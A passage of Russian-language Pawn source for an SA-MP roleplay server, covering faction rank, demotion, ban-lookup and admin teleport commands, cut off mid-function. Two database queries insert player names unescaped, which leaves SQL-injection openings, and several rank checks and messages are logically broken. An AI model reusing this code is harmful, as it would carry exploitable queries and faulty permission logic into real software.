	if(PlayerInfo[playerid][pMember] != 2 && PlayerInfo[playerid][pMember] != 7) return SCM(playerid, COLOR_GREY, " Функция доступна Мэру и ФБР с 6 ранга");
	if(PlayerInfo[playerid][pMember] == 2 && PlayerInfo[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Доступно с 6 ранга");
	if(PlayerInfo[playerid][pMember] == 7 && PlayerInfo[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Функция доступна Мэру и ФБР с 6 ранга");
	new para1, reason[32], str[128];
	if(sscanf(params, "us[32]", para1, reason)) return SCM(playerid, -1, " Введите: /demote [id] [Причина]");
	new playerName[32], paraName[32];
	GetPlayerName(playerid, playerName, sizeof(playerName));
	GetPlayerName(para1, paraName, sizeof(paraName));
	if(PlayerInfo[para1][pMember] == 1 || PlayerInfo[para1][pMember] == 10 || PlayerInfo[para1][pMember] == 21)
	{
		if(PlayerInfo[para1][pRank] > 10) return SCM(playerid, COLOR_GREY, " Человек имеет ранг больше 10");
		if(PlayerInfo[para1][pRank] > 1)
		{
		    PlayerInfo[para1][pRank] -= 1;
		    if(PlayerInfo[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s понизил вас до %i ранга. Причина: %s", playerName, PlayerInfo[para1][pRank], reason);
			else if(PlayerInfo[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s понизил вас до %i ранга. Причина: %s", playerName, PlayerInfo[para1][pRank], reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы понизили %s до %i ранга. Причина: %s", paraName, PlayerInfo[para1][pRank], reason);
			SCM(playerid, COLOR_BLUE, str);
		}
		else if(PlayerInfo[para1][pRank] == 1)
		{
		    PlayerInfo[para1][pMember] = 19;
		    PlayerInfo[para1][pRank] = 4;
		    PlayerInfo[para1][pModel] = 287;
			SetPVarInt(para1, "Fraction_Duty", 1);
			SpawnPlayer(para1);
			SetPlayerToTeamColor(para1);
		    if(PlayerInfo[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s перевёл вас обратно в армию. Причина: %s", playerName, reason);
			else if(PlayerInfo[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s перевёл вас обратно в армию. Причина: %s", playerName, reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы перевели %s обратно в армию. Причина: %s", paraName, reason);
			SCM(playerid, COLOR_BLUE, str);
		}
	}
	else if(PlayerInfo[para1][pMember] == 3 || PlayerInfo[para1][pMember] == 19)
	{
	    if(PlayerInfo[para1][pRank] > 10) return SCM(playerid, COLOR_GREY, " Человек имеет ранг больше 10");
	    if(PlayerInfo[para1][pRank] > 1)
		{
		    PlayerInfo[para1][pRank] -= 1;
		    if(PlayerInfo[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s понизил вас до %i ранга. Причина: %s", playerName, PlayerInfo[para1][pRank], reason);
			else if(PlayerInfo[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s понизил вас до %i ранга. Причина: %s", playerName, PlayerInfo[para1][pRank], reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы понизили %s до %i ранга. Причина: %s", paraName, PlayerInfo[para1][pRank], reason);
			SCM(playerid, COLOR_BLUE, str);
		}
		else if(PlayerInfo[para1][pRank] == 1)
		{
            PlayerInfo[para1][pMember] = 0;
			PlayerInfo[para1][pRank] = 0;
			PlayerInfo[para1][pJob] = 0;
			SetPlayerArmourAC(para1,0);
			SetPlayerColor(para1, TEAM_HIT_COLOR);
			SpawnPlayer(para1);
			SCM(para1, COLOR_BLUE, " Рабочий день окончен");
		    if(PlayerInfo[playerid][pMember] == 2)
				format(str, sizeof(str), " Агент ФБР %s уволил вас из армии. Причина: %s", playerName, reason);
			else if(PlayerInfo[playerid][pMember] == 7)
				format(str, sizeof(str), " Мэр %s уволил вас из армии. Причина: %s", playerName, reason);
			SCM(para1, COLOR_BLUE, str);
			format(str, sizeof(str), " Вы уволили %s из армии. Причина: %s", paraName, reason);
			SCM(playerid, COLOR_BLUE, str);
		}
	}
	else SCM(playerid, COLOR_GREY, " Игрок не состоит в Армии / ПД");
	return true;
}
CMD:offgiverank(playerid, params[])
{
	if(PlayerInfo[playerid][pLogin] == 0 || PlayerInfo[playerid][pLeader] == 0) return true;
	new params_name[24], params_rank;
	if(sscanf(params, "s[24]d", params_name, params_rank)) return SCM(playerid, -1, " Введите: /offgiverank [Имя] [Ранг]");
	mysql_format(DATABASE, QUERY, 62, "SELECT * FROM "TABLE_ACCOUNTS" WHERE Name='%e' and pMember = '%d'", params_name,PlayerInfo[playerid][pMember]);
	new Cache:result = mysql_query(DATABASE, QUERY);
	if(cache_num_rows())
	{
		switch(PlayerInfo[playerid][pMember])
		{
		    case 1,10,21:
			{
				switch(params_rank) { case 1..13: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 13"); } }
			}
		    case 2,4,5,6,9,11,12,13,14,15,16,17,18,20,24,26,29:
			{
	            switch(params_rank) { case 1..9: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 9"); } }
			}
		    case 3,19:
			{
			    switch(params_rank) { case 1..14: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 14"); } }
			}
		    case 7:
			{
				switch(params_rank) { case 1..9: {} default: { return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 9"); } }
			}
		}
		SendMes(playerid,COLOR_BLUE," Вы понизили/повысили %s до %d ранга",params_name,params_rank);
		mysql_format(DATABASE,QUERY, 256, "UPDATE "TABLE_ACCOUNTS" SET pText = '10', pRank = '%i' WHERE name = '%s'",params_rank, params_name);
		mysql_function_query(DATABASE,QUERY,false,"","");
		format(YCMDstr, sizeof(YCMDstr), " Лидер %s[%i] offGiveRank %s : %i ранг", Name(playerid), playerid, params_name, params_rank);
		ABroadCast(COLOR_YELLOW, YCMDstr, 3);
		printf(YCMDstr);
	}
	else SCM(playerid, COLOR_GREY, " Ошибка: Игрок не в вашей фракции");
	return cache_delete(result, DATABASE);
}
CMD:anim(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1) return true;
	if(sscanf(params, "sii", params[0], params[1], params[2]))
	{
		SCM(playerid, -1, " Введите: /anim [библиотека] [номер анимации] [повторять]");
	}
	return true;
}
CMD:sort(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1) return true;
	if(sscanf(params, "sii", params[0], params[1], params[2]))
	{
		SCM(playerid, -1, " Введите: /sort [Ключ] [Сортировка = 1] [Размер = 30]");
		SCM(playerid, -1, "   [Ключ] Доступные ключи: RPR, TAXILVL, MONEY, BANK, BUS");
		SCM(playerid, -1, "   [Сортировка<Не обязательный>] Доступные значения <По убыванию: 1> или <По возрастанию: 0>. <По умолчанию: 1>");
		SCM(playerid, -1, "   [Размер<Не обязательный>] Количество строк в списке: от 1 до 50. <По умолчанию: 30>");
	}
	return true;
}
CMD:bantime(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	new params_name[24];
	if(sscanf(params, "s[24]", params_name)) return SCM(playerid, -1, " Введите: /bantime [name]");
	mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_BAN"` WHERE `Name` = '%s'",params_name);
	new Cache:result = mysql_query(DATABASE, QUERY);
	if(cache_num_rows())
	{
		new ban = cache_get_field_content_int(0,"Unban");
		new ddate = cache_get_field_content_int(0,"Date");
		new nameadmin[32], banreason[32];
		cache_get_field_content(0,"NameAdmin", nameadmin);
		cache_get_field_content(0,"Reason", banreason);
		new year, month, day,hour,minute,second;
		new byear, bmonth, bday,bhour,bminute,bsecond;
		TimestampToDates(ban, year, month, day, hour, minute, second, 0);
		TimestampToDates(ddate, byear, bmonth, bday, bhour, bminute, bsecond, 0);
		format(YCMDstr, sizeof(YCMDstr), "{D95A41}Этот аккаунт заблокирован\nЗабанил: %s\nПричина: %s\nДата бана: %i/%02i/%02i %02i:%02i:%02i\nДата разбана: %i/%02i/%02i %02i:%02i:%02i\n\nВведите \"/q\" чтобы выйти\n",nameadmin, banreason, byear,bmonth,bday,bhour,bminute,bsecond, year,month,day,hour,minute,second);
		ShowPlayerDialogEx(playerid,78,0,"{c22000}Внимание",YCMDstr,"Закрыть","");
	}
	else SCM(playerid, COLOR_GREY, " Аккаунт не в бане");
	return cache_delete(result, DATABASE);
}
CMD:giverank(playerid, params[])
{
    if(PlayerInfo[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	new para1;
	new level;
	new giveplayer[MAX_PLAYER_NAME];
	new sendername[MAX_PLAYER_NAME];
	if(sscanf(params, "ud",para1,level)) return    SCM(playerid, -1, " Введите: /giverank [id] [ранг]");
	if(PlayerInfo[playerid][pRank] <= PlayerInfo[para1][pRank]) return SCM(playerid, COLOR_GREY, "[Ошибка] Вы не можете повысить/понизить этого игрока");
	if(PlayerInfo[playerid][pMember] == 1) { if(level > 14 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 14!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 2) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 7!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 3) { if(level > 15 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 14!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 4) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 5) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 6) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 7) { if(level > 5 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 5!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 8) { if(level > 2 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 2!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 9) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 10) { if(level > 14 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 5!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 11) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 12) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 13) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 10!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 14) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 15) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 16) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 17) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 18) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 19) { if(level > 15 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 14!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 20) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 21) { if(level > 14 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 14!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 22) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 24) { if(level > 8 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 8!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 26) { if(level > 8 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 8!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 29) { if(level > 8 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 8!"); return true; } }
	else if(PlayerInfo[playerid][pMember] == 33) { if(level > 9 || level < 1) { SCM(playerid, COLOR_GREY, "Нельзя меньше 1 и больше 9!"); return true; } }
	if(level >= PlayerInfo[playerid][pRank]) return SCM(playerid,COLOR_GREY,"Вы не можете повышать выше своего ранга");
	if (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 21 && PlayerInfo[playerid][pRank] >= 12)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "[Ошибка] Вы указали свой ID"); return true; }
					if (PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "[Ошибка] Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 11) return SCM(playerid,COLOR_GREY,"Не выше 11 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга.", giveplayer,level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if (PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 19 && PlayerInfo[playerid][pRank] >= 13)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 12) return SCM(playerid,COLOR_GREY,"Не выше 12 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга", giveplayer, level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 23 && PlayerInfo[playerid][pRank] >= 7)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "[Ошибка] Вы указали свой ID"); return true; }
					if (PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "[Ошибка] Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 5) return SCM(playerid,COLOR_GREY,"Не выше 5 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга.", giveplayer,level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pMember] == 18 || PlayerInfo[playerid][pMember] == 20 && PlayerInfo[playerid][pRank] >= 7)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "[Ошибка] Вы указали свой ID"); return true; }
					if (PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "[Ошибка] Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 6) return SCM(playerid,COLOR_GREY,"Не выше 6 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга.", giveplayer,level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 7)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 3) return SCM(playerid,COLOR_GREY,"Не выше 3 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга", giveplayer, level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 8 && PlayerInfo[playerid][pRank] >= 2)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга", giveplayer, level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 13 && PlayerInfo[playerid][pRank] >= 7)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 6) return SCM(playerid,COLOR_GREY,"Не выше 7 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга", giveplayer, level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if (PlayerInfo[playerid][pMember] == 33 || PlayerInfo[playerid][pMember] == 33 && PlayerInfo[playerid][pRank] >= 7)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 5) return SCM(playerid,COLOR_GREY,"Не выше 5 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга", giveplayer, level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 22 &&PlayerInfo[playerid][pRank] >= 7)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 5) return SCM(playerid,COLOR_GREY,"Не выше 5 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга", sendername, level);
					SCM(para1, 0x6495EDFF, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга", giveplayer, level);
					SCM(playerid, 0x6495EDFF, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
	}
	else if(PlayerInfo[playerid][pMember] == 24 && PlayerInfo[playerid][pRank] > 4 || PlayerInfo[playerid][pMember] == 26 && PlayerInfo[playerid][pRank] > 4 || PlayerInfo[playerid][pMember] == 29 && PlayerInfo[playerid][pRank] > 4)
	{
		if(IsPlayerConnected(para1))
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[para1][pMember])
			{
				if(para1 != INVALID_PLAYER_ID)
				{
					if(para1 == playerid) { SCM(playerid, COLOR_GREY, "Вы указали свой ID"); return true; }
					if(PlayerInfo[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, "Вы указали ID лидера"); return true; }
					if(PlayerInfo[playerid][pLeader] == 0 && level > 5) return SCM(playerid,COLOR_GREY,"Не выше 5 ранга!");
					GetPlayerName(para1, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					PlayerInfo[para1][pRank] = level;
					format(string, 128, "%s повысил/понизил вас до %i ранга ",sendername, level);
					SCM(para1, 0x6BB3FFAA, string);
					format(string, 128, "Вы повысили/понизили %s до %i ранга.", giveplayer,level);
					SCM(playerid, 0x6BB3FFAA, string);
				}
			}
			else return SCM(playerid, COLOR_GREY, "Данный игрок не в вашей фракции!");
		}
		mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pRank = '%i' WHERE name = '%e'", PlayerInfo[para1][pRank], PlayerInfo[para1][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
	}
	return true;
}
CMD:agiverank(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return SCM(playerid, -1, " Введите: /agiverank [playerid] [ранг от 1 до 7]");
	if(params[1] > 7 || params[1] < 0) { SCM(playerid, COLOR_GREY, " Не мене 0 и не более 7!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	PlayerInfo[params[0]][pRank] = params[1];
	format(string, 128, " %s повысил/понизил вас до %i ранга", Name(playerid), params[1]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вы повысили/понизили %s до %i ранга.",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	return true;
}
CMD:teleport(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	new x_tp;
	if(sscanf(params, "d", x_tp))
	{
		ShowPlayerDialogEx(playerid, 10093, DIALOG_STYLE_LIST, "Телепорт", "[0] Основное", "Выбрать", "Назад");
		SCM(playerid, -1, " Введите: /tp [ключ]");
		return true;
	}
	new Float:tpx, Float:tpy, Float:tpz, tpvw, tpint, Float:ptpx, Float:ptpy, Float:ptpz;
	switch(x_tp)
	{
	    case 1:
		{
			ptpx = 1134.9340, ptpy = -1755.3342, ptpz = 13.2847;
			tpx = 1575.0957, tpy = -1694.8140, tpz = 6.2188;
			tpint = 0; tpvw = 0;
		}
	    case 2:
		{
			ptpx = 978.7877, ptpy = 30.9696, ptpz = 1001.1465;
			tpx = 268.3361,tpy = 81.3648,tpz = 1001.0391;
            tpint = 6, tpint = 30;
		}
	    case 3:
	    {
			ptpx = -2026.0707, ptpy = 179.2475, ptpz = 28.8359;
			tpx = 1478.7388,tpy = -1740.8102,tpz = 13.5469;
            tpint = 0, tpint = 0;
		}
	    case 4:
		{
			ptpx = 1797.3173, ptpy = 839.3347, ptpz = 10.6719;
			tpx = 1135.7295,tpy = -1756.0243,tpz = 13.5811;
            tpint = 0, tpint = 0;
		}
	    case 5:
		{
			ptpx = -2442.0095, ptpy = 522.6154, ptpz = 29.6196;
			tpx = -110.4161,tpy = -1140.6246,tpz = 1.6458;
            tpint = 0, tpint =0;
		}
	    case 6:
		{
			ptpx = 2182.6470, ptpy = -2276.5984, ptpz = 13.5337;
			tpx = -2032.9954,tpy = -84.5489,tpz = 35.8284;
            tpint = 0, tpint = 0;
		}
	    case 7:
		{
			ptpx = 2201.7083, ptpy = -1697.3547, ptpz = 13.6818;
			tpx = -2441.6545,tpy = 521.0729,tpz = 29.9168;
            tpint = 0, tpint = 0;
		}
	    case 8:
		{
			ptpx = -2042.7015, ptpy = -92.3698, ptpz = 35.1718;
			tpx = -1543.5612,tpy = -427.5089,tpz = 5.8583;
            tpint = 0, tpint = 0;
		}
	    case 9:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 1472.8420,tpy = -2481.2085,tpz = 13.5547;
            tpint = 0, tpint = 0;
		}
		case 10:
		{
		    ptpx = 1249.2120, ptpy = -1819.5248, ptpz = 13.4101;
			tpx = 212.3810,tpy = 1916.1110,tpz = 17.6406;
            tpint = 0, tpint = 0;
		}
	    case 11:
		{
			ptpx = 1483.4178, ptpy = -1743.8053, ptpz = 13.5469;
			tpx = 1797.0323, tpy = 865.5620,tpz = 11.3155;
            tpint = 0, tpint = 0;
		}
		case 12:
		{
		    ptpx = 1417.4324, ptpy = 1703.7415, ptpz = 13.2478;
			tpx = -2608.2639, tpy = 1400.1230,tpz = 7.1323;
            tpint = 0, tpint = 0;
		}
		case 13:
		{
			ptpx = 82.1025, ptpy = 1920.3364, ptpz = 17.6807;
			tpx = 1973.7936, tpy = 1039.2103, tpz = 994.4688;
            tpint = 10, tpint = 0;
		}
  		case 14:
		{
			ptpx = 1672.6022, ptpy = 2262.3828, ptpz = 10.8203;
			tpx = 2830.4048, tpy = 1312.9185, tpz = 10.7729;
            tpint = 0, tpint = 0;
		}
		case 15:
		{
		    ptpx = 1359.0708, ptpy = -1278.9153, ptpz = 13.3582;
			tpx = 1961.2422, tpy = -2181.9412, tpz = 13.5469;
            tpint = 0, tpint = 0;
		}
	    case 16:
		{
